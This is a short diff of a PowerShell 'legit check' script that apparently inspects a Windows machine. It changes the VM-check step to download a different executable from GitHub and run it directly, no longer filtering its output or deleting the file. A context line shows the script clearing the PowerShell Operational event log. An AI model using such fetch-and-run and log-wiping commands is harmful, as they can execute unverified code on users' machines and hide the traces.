@@ -106,15 +106,9 @@ if ($javawDlls) {
 Write-Host ""
 
 #VM Check
-Invoke-WebRequest "https://github.com/denisshiferfpidr/legit-check/raw/refs/heads/main/vmcheck.exe" -OutFile "1.exe"
+Invoke-WebRequest "https://github.com/denisshiferfpidr/legit-check/raw/refs/heads/main/vma.exe" -OutFile "1.exe"
 Write-Host "VM check:"
-$puk = ./1.exe
-foreach($line in ($puk -split "`n")) {
-    if($line.Contains("CONCLUSION")) {
-        Write-Host $line
-    }
-}
-if (Test-Path "1.exe") { Remove-Item -Path "1.exe" -Force }
+Invoke-Expression ".\1.exe"
 Write-Host ""
 #END
 
@@ -327,6 +321,7 @@ wevtutil clear-log "Microsoft-Windows-PowerShell/Operational"
 
 
 Write-Host "Done! $($duration.TotalMinutes.ToString("F2")) min"
+
 
 
 
